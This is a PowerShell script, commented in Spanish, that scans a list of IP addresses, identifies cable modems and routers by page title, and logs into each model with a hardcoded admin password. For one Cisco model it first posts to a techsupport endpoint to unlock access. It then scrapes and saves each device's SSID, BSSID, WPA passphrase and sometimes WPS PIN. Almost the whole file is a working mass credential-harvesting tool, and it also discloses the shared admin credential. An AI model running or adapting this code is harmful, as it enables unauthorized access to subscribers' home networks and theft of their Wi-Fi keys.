$ACTUAL_PATH = Get-Location;
$SAVE_FOLDER = "$ACTUAL_PATH\save";
$IPs_LIST_PATH = "$ACTUAL_PATH\NATIp.txt";
$IPs_FAILED = "$ACTUAL_PATH\Fail.txt";

function verifyFile(){
	if([System.IO.File]::Exists($save)){
		if((Get-Item $save).length -gt 500){
			(Get-Content $save) -replace '\-', ':' | Set-Content $save;
		}else{
			Add-Content -Path "$IPs_FAILED" -Value "$line";
			Remove-Item $save
		}
	}else{
		Write-Output "No se pudo obtener información. Verificar credenciales";
	}
}

function createDirectory($DirectoryToCreate){
	if (!(Test-Path -LiteralPath $DirectoryToCreate)) {
		try {
			New-Item -Path $DirectoryToCreate -ItemType Directory -ErrorAction Stop | Out-Null
			"Directorio creado '$DirectoryToCreate'."
		}
		catch {
			Write-Error -Message "No se puede crear el directorio '$DirectoryToCreate'. Error: $_" -ErrorAction Stop
		}
	}
}

function setup(){
	#Verificar si existe la lista de IPs
	if(!(Test-Path $IPs_LIST_PATH)){
		Write-Output "No se encuentra la lista de IPs"
		break;
	}

	#Crear directorio donde se guardará los resultados del escaner
	createDirectory $SAVE_FOLDER

	#Archivo donde se guardan las IPs fallidas
	if(!(Test-Path $IPs_FAILED)){
		try {
			New-Item -Path $IPs_FAILED -ItemType File -ErrorAction Stop | Out-Null
		}
		catch {
			Write-Error -Message "No se puede crear el Archivo '$IPs_FAILED'. Error: $_" -ErrorAction Stop
		}
	}
}

# Credits to Martin9700
# http://community.spiceworks.com/scripts/show/1887-get-telnet-telnet-to-a-device-and-issue-commands
Function Get-Telnet{
	Param (
        [Parameter(ValueFromPipeline=$true)]
        [String[]]$Commands = @("admin","password","disable clipaging","sh config"),
        [string]$RemoteHost = "HostnameOrIPAddress",
        [string]$Port = "23",
        [int]$WaitTime = 1000
    )
    #Attach to the remote device, setup streaming requirements
    $Socket = New-Object System.Net.Sockets.TcpClient($RemoteHost, $Port)
    If ($Socket){   
		$Stream = $Socket.GetStream()
        $Writer = New-Object System.IO.StreamWriter($Stream)
        $Buffer = New-Object System.Byte[] 1024 
        $Encoding = New-Object System.Text.AsciiEncoding

        #Now start issuing the commands
        ForEach ($Command in $Commands){   
			$Writer.WriteLine($Command) 
            $Writer.Flush()
            Start-Sleep -Milliseconds $WaitTime
        }
        #All commands issued, but since the last command is usually going to be
        #the longest let's wait a little longer for it to finish
        Start-Sleep -Milliseconds ($WaitTime * 4)
        $Result = ""
        #Save all the results
        While($Stream.DataAvailable) {
			$Read = $Stream.Read($Buffer, 0, 1024) 
            $Result += ($Encoding.GetString($Buffer, 0, $Read))
        }
		$Result | Out-File $save
    }Else{
		Write-Output "No se pudo conectar a $RemoteHost."
    }
    
}

#===================Routers=====================
# Technicolor y Thompson que usan DOCSIS 2.0 
function techTom($ip){
	Write-Output "=========$ip - Technicolor - Thompson=========" 
	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl -o $save --connect-timeout 3 -m 60 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
	verifyFile;
	if([System.IO.File]::Exists($save)){
		$thompson = Get-Content $save
		try{
			$BSSID = ($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
			$PASS = ($thompson -match ('size=32 maxlength=64 value=".*"')).split('"')[5]
			"$BSSID - $PASS"
		}catch{
			"Debugging error in Thompson"
			$thompson
		}

	}
}

# Cisco DPC3925
function cisco($ip){
	Write-Output "=========$ip - Cisco DPC3925=========" 
	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
    wget -qO- -q --keep-session-cookies --save-cookies $cookie --post-data "username_login=admin&password_login=Uq-4GIt3M&LanguageSelect=en&Language_Submit=0&login=Log+In" -T 3 http://$ip/goform/Docsis_system | out-null;
	if(Test-Path $cookie){
		wget -qO- -q --load-cookies $cookie -O $save --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" --header="Referer: http://$ip/Status.asp" --header="Connection: keep-alive" -T 3 http://$ip/WNetwork.asp | out-null;
		verifyFile
		Remove-Item $cookie;
	}else{
		Write-Output "No se pudo obtener acceso a $ip. Verificar credenciales"
	}
}

# Tech WAN
function wan($ip){
	Write-Output "=========$ip - Wan=========" 
	Get-Telnet -RemoteHost "$ip" -Commands " ","admin","Uq-4GIt3M","cd wifi","show nvram" 
   	verifyFile
	if([System.IO.File]::Exists($save)){
		$wan = Get-Content $save
		$SSID = ($wan -match 'wl0_ssid=.*').replace('wl0_ssid=','')
		$BSSID = ($wan -match 'macaddr=.*').replace('macaddr=','').ToUpper()
		$PASS = ($wan -match 'wl0_wpa_psk=.*').replace('wl0_wpa_psk=','')
		$PIN = ($wan -match 'wps_device_pin=.*').replace('wps_device_pin=','')
		"$SSID - $BSSID - $PASS"
	}
	
}

# Motorola con DOCSIS 2.0
function motorola($ip){ 
	Write-Output "=========$ip - Motorola DOCSIS 2.0=========" 
    curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
    curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl --connect-timeout 3 -m 60 -s -o $save -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
    verifyFile
	if([System.IO.File]::Exists($save)){
		$motorola = Get-Content $save
		$BSSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[1].Trim()
		$SSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[0].replace('<tr><td align=middle valign=top colspan=2 bgcolor=#E7DAAC>','').Trim()
		$PASS = (($motorola -match 'size=32 maxlength=64 value=".*"') -split 'value="' -split '"></tr><tr>')[1]
		"$SSID - $BSSID - $PASS"
	}
}

# Motorola SBG900
function motorolasbg($ip){ 
	Write-Output "=========$ip - Motorola SBG900=========" 
    if((Invoke-WebRequest -Uri "http://$ip/frames.asp" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/index.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "userId=admin&password=Uq-4GIt3M&btnLogin=Log+In").content -match '\d\d\d\d\d'){
    $sessionID = $Matches[0]
    curl -o $save --connect-timeout 3 -m 60 -s http://$ip/wireless/wirelessStatus.asp?sessionId=$sessionID -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=29805" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure
    verifyFile
    }
}

# Desbloquear caracteristicas wireless de los Cisco DPC2420
function unlockCisco($ip){
	curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv1=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff2=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv2=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv16=1" "http://$ip/goform/techsupport.asp" | out-null;
}


# Cisco DPC2420
function ciscoAuth($ip){
	Write-Output "=========$ip - Cisco DPC2420=========" 
	unlockCisco $ip;
	unlockCisco $ip;
	curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp  | out-null;
    curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp;
    verifyFile
}

# Technicolor CGA0101
function techCGA0101($ip){
	Write-Output "=========$ip - Technicolor CGA0101=========" 
    curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
	curl -o $save --connect-timeout 10 -m 60 -s -H 'Host: $ip' -H 'Accept: */*' -H 'X-CSRF-TOKEN: ' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --compressed http://$ip/Wir_WirelessAPI.json;
	verifyFile
	$json = ((Get-Content $save | Out-String | ConvertFrom-Json).1).data
	Write-Output $json.SSID - $json.KeyPassphrase
}

# Technicolor DPC3928SL2 
function techDPC3928SL2($ip){
	Write-Output "=========$ip - Technicolor DPC3928SL2=========" 
    Invoke-WebRequest -Uri "http://$ip/goform/Docsis_system" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="http://$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/logout.htm"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "username_login=admin&password_login=Uq-4GIt3M&Language_English=1&login=Log+In&todo=&this_file=Docsis_system.htm&next_file=Docsis_system.htm&message=%40msg_text%23" | out-null
	$content = (Invoke-WebRequest -Uri "http://$ip/WRadioSettings.asp" -Headers @{"Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/WPS.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content
	$content | Out-File $save
	verifyFile
	if($content -match '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})'){
		$BSSID = $Matches[0]
		if($content -match 'name="wl_ssid0" value=".*"'){
			$SSID = ($Matches[0]).replace('name="wl_ssid0" value=','').split('"')[1]
			if((Invoke-WebRequest -Uri "http://$ip/WSecurity.asp" -Headers @{"Upgrade-Insecure-Requests"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "DNT"="1"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content -match 'size="25" maxlength="64" value=".*'){
				$PASS = $Matches[0].replace('size="25" maxlength="64" value="','').split('"')[0]
				"$BSSID - $SSID - $PASS"
			}
		}
	}	
	
}

# Hitron CGNV2
function hitron($ip){
	Write-Output "=========$ip - Hitron CGNV2=========" 
	Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","wpaKeygetnow","cable" ,"system" ,"ipPrint"
	verifyFile
}

# Ubee con DOCSIS 3.0
function ubee($ip){
	Write-Output "=========$ip - Ubee=========" 
    curl --connect-timeout 3 -m 10 -s -d "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
    curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
    verifyFile
}

#Ubee sin DOCSIS
function ubeeA($ip){
	Write-Output "=========$ip - Ubee sin DOCSIS=========" 
    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanBasic.asp;
    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanBasic.asp;
    curl -o $save --connect-timeout 3 -m 60 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanBasic.asp;
    verifyFile
}

function runScanner(){
	setup
	foreach($line in Get-Content .\NATIp.txt) {
		$title = curl --connect-timeout 3 -m 10 -s -L $line | findstr -i title
		if(![string]::IsNullOrEmpty($title)){
			$save = "$SAVE_FOLDER\$line.txt"
			switch -regex ($title){
				".*HTTP 401 - Unauthorized.*" {techTom $line; break}
				".*<title>Setup</title>.*" {cisco $line; break}
				".*<title>WAN</title>.*" {wan $line; break}
				".*<title>Residential Gateway Login</title>.*" {motorola $line; break}
				".*<title>Motorola SBG900</title>.*"  {motorolasbg $line; break}
				".*<TITLE>Cisco Cable Modem</TITLE>.*" {ciscoAuth $line; break}
				".*<title>Cisco Cable Modem</title>.*"  {ciscoAuth $line; break}
				".*<title>Common UI</title>.*" {techCGA0101 $line; break}
				".*vt_docsystem.*" {techDPC3928SL2 $line; break}
				".*CGNV2.*" {hitron $line; break}
				".*Touchstone.*" {"$line - Arris (No support)"; Break}
				".*<title>Residential Gateway Configuration: Login</title>.*" {ubee $line; break}
				".*<title>Residential Gateway Configuration: Cable Modem - Navigation</title>.*" {ubeeA $line; break}
				default {Write-Output "$line - $title"; Break}
			}
		}
	}
}

runScanner

Read-Host -Prompt "Press Enter to exit"